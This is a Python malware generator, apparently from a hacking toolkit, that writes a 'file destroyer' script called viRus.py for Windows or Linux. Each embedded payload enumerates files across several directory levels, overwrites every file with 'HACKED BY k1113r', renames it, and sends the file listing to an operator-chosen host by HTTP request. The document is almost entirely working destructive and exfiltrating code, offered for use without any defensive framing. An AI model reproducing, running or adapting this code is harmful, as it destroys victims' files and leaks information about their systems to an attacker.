import os
from termcolor import colored

print(colored("""
            |||||
           // \\\\\\\\
          //   \\\\\\\\
         // ||| \\\\\\\\
        //  |||  \\\\\\\\
       //   |||   \\\\\\\\
      //           \\\\\\\\
     //     [|]     \\\\\\\\
    |||||||||||||||||\\\\\\\\
""",'red'))
v_w = """
import requests
import time
import os

# THIS REMOTE VIRUS IS CREATED BY k1113r
host = input("receiver :> ")
# writing directory and file
print("------------------VIRUS ACTIVATED----------------------")
c1 = os.popen('powershell -command "ls -n -file .\\\* ; Format-Table; ls -n -file .\\\*\\\* ; Format-Table; ls -n -file .\\\*\\\*\\\* ; Format-Table; ls -n -file .\\\*\\\*\\\*\\\* ; Format-Table;" ').read()
time.sleep(1)
time.sleep(1)
print("GETTING FILES..........")
time.sleep(1)
time.sleep(1)
file_i = 'k1113R.txt'
file_a = open(f"{file_i}",'w')
file_a.write(c1)
file_a.close()

# geting all file
a = open(f".\\\{file_i}").read()
b = a.splitlines()

# modify remote files
for k in b:
 file_d = open(f".\\\{k}",'w')   
 file_d.write("HACKED BY k1113r")
 os.system(f"powershell -command 'mv .\\\{k} .\\\{k}.hacked_by_k1113r'")
 file_d.close()
os.system("powershell -command 'rm .\\\\viRus.py.hacked_by_k1113r'")

# send data to host
file_j = open(f".\\\{file_i}").read()
file_base64 = f"{file_j}"
url_enc = requests.utils.quote(file_base64) 
requests.get(f"http://{host}/?{url_enc}")
print("------------------VIRUS DEACTIVATED----------------------"

"""

v_l = """
import os 
import requests
import time

# THIS REMOTE VIRUS IS CREATED BY k1113r
host = input("receiver :> ")
# writing directory and file
print("------------------VIRUS ACTIVATED----------------------")
c1 = os.popen('find ./* -maxdepth 1 -not -type d && find ./*/* -maxdepth 1 -not -type d && find ./*/*/* -maxdepth 1 -not -type d && find ./*/*/*/* -maxdepth 1 -not -type d && find ../* -maxdepth 1 -not -type d && find ../../* -maxdepth 1 -not -type d && find ../../../* -maxdepth 1 -not -type d').read()
time.sleep(1)
time.sleep(1)
print("GETTING FILES..........")
time.sleep(1)
time.sleep(1)
file_i = 'k1113R.txt'
file_a = open(file_i,'w')
file_a.write(c1)
file_a.close()

# geting all file
a = open(file_i).read()
b = a.splitlines()

# modify remote files
for k in b:
 file_d = open(k,'w')   
 file_d.write("HACKED BY k1113r")
 os.system(f"mv {k} {k}.hacked_by_k1113r")
 file_d.close()
os.system("rm -r ./viRus.py.hacked_by_k1113r")

# send data to host
file_j = open(file_i).read()
file_base64 = os.popen(f"base64 {file_i}").read()
url_enc = requests.utils.quote(file_base64) 
requests.get(f"http://{host}/?{url_enc}")
print("------------------VIRUS DEACTIVATED----------------------")

"""
choose = input(colored("# For - windows[win] Or linux[Lin] ? :",'red'))
log_file = open('log/log.txt','a')
log_file.write(f'[sub] file destroyer generator --> machine {choose}\n')
log_file.close()
os.system("touch ./viRus.py")
file_open = open("./viRus.py",'w')
if choose=='win' or choose=='windows':
 file_open.write(f"""{v_w}""")
 print(colored("#info# - viRus fOr wInDoWs mAcHiNe iS cReAtEd [./viRus.py]",'blue'))
elif choose=='lin' or choose=='linux':
 file_open.write(f"""{v_l}""")
 print(colored("#info# - viRus fOr lInUx mAcHiNe iS cReAtEd [./viRus.py]",'blue'))
else:
 print("#error#")
file_open.close()
 
